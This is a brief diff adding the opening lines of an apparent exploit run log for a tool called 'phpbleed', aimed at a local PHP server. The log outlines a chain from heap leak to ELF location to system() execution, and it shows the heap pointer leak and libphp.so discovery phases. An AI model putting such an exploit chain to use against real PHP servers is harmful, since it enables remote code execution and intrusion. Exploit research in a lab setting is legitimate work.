@@ -1,0 +1,13 @@
+============================================================
+============================================================
+  phpbleed: heap -> ELF -> EG -> system() -> canary over HTTP
+  Target: http://127.0.0.1:8089/index.php
+============================================================
+17:51:17Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+
+[Phase R-1] Heap leak
+17:51:17Z [R-1] heap_ref = 0xe908b80571a0 (reqs=1)
+  heap_ref = 0xe908b80571a0
+
+[Phase R-2] Finding libphp.so
+  ELF @ 0xe908b9000000 phnum=9 (18 reqs)
